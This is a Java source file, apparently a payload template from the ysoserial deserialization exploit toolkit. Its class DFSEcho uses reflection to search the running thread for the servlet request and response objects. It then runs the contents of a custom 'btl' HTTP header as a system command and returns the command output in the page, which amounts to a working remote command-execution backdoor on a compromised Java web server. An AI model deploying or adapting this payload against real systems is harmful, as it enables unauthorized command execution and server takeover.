package ysoserial.template;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashSet;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.util.*;

public class DFSEcho {

    private HashSet set = new HashSet();
    private Object http_request_obj = null;
    private Object http_response_obj = null;
    private Class http_request_clazz = Class.forName("javax.servlet.http.HttpServletRequest");
    private Class http_response_clazz = Class.forName("javax.servlet.http.HttpServletResponse");

    public DFSEcho() throws Exception {
        http_request_obj = null;
        http_response_obj = null;
        System.out.println("start search...");
        search(Thread.currentThread());
        System.out.println("Search end...");
        System.out.println(this.http_request_obj);
        System.out.println(this.http_response_obj);
        if(http_response_clazz.isAssignableFrom(getResponse().getClass())  && http_request_clazz.isAssignableFrom(getRequest().getClass())){
            HttpServletResponse response = (HttpServletResponse) http_response_obj;
            HttpServletRequest  request = (HttpServletRequest) http_request_obj;
            if(request.getHeader("btl") != null){
                Process p= Runtime.getRuntime().exec(request.getHeader("btl"));
                InputStream fis=p.getInputStream();
                InputStreamReader isr=new InputStreamReader(fis);
                BufferedReader br=new BufferedReader(isr);
                String line=null;
                while((line=br.readLine())!=null)
                {
                    response.getWriter().println(line);
                }
                response.getWriter().println("==================================");
                response.getWriter().flush();
            }
        }
    }

    public Object getRequest(){
        return http_request_obj;
    }
    public Object getResponse(){
        return http_response_obj;
    }

    public void search(Object obj) throws IllegalAccessException {
        if (obj == null){
            return;
        }
        if (http_request_obj != null && http_response_obj != null){
            return;
        }
        if (obj.getClass().equals(Object.class) ) {
            return;
        }
        if (http_request_clazz.isAssignableFrom(obj.getClass())){
            System.out.println("Found request");
            http_request_obj = obj;
            return;
        }
        if (http_response_clazz.isAssignableFrom(obj.getClass())){
            System.out.println("Found response");
            http_response_obj = obj;
            return;
        }
        if (obj.getClass().isArray()) {
            for (int i = 0; i < Array.getLength(obj); i++) {
                search(Array.get(obj, i));
            }
        } else {
            Queue q = getAllFields(obj);
            while (!q.isEmpty()) {
                Field field = (Field) q.poll();
                field.setAccessible(true);
                Object fieldValue = field.get(obj);
                if(http_request_clazz.isAssignableFrom(fieldValue.getClass())){
                    http_request_obj = fieldValue;
                }
                else if(http_response_clazz.isAssignableFrom(fieldValue.getClass())){
                    http_response_obj = fieldValue;
                }else{
                    search(fieldValue);
                }

            }
        }
    }

    public Queue getAllFields(Object obj) throws IllegalAccessException {
        Queue queue = new LinkedList();
        for (Class clazz = obj.getClass(); clazz != null; clazz = clazz.getSuperclass()) {
            Field[] fields = clazz.getDeclaredFields();
            for (Field f : fields) {
                if (f.getType().isPrimitive()) {
                    continue;
                } else if (f.getType().isArray() && f.getType().getComponentType().isPrimitive()) {
                    continue;
                }  else {
                    f.setAccessible(true);
                    Object fieldValue = f.get(obj);
                    if (fieldValue != null) {
                        int hashcode = fieldValue.hashCode();
                        if (set.contains(hashcode)) {
                        } else {
                            set.add(hashcode);
                            queue.offer(f);
                        }
                    }
                }
            }
        }
        return queue;
    }

}

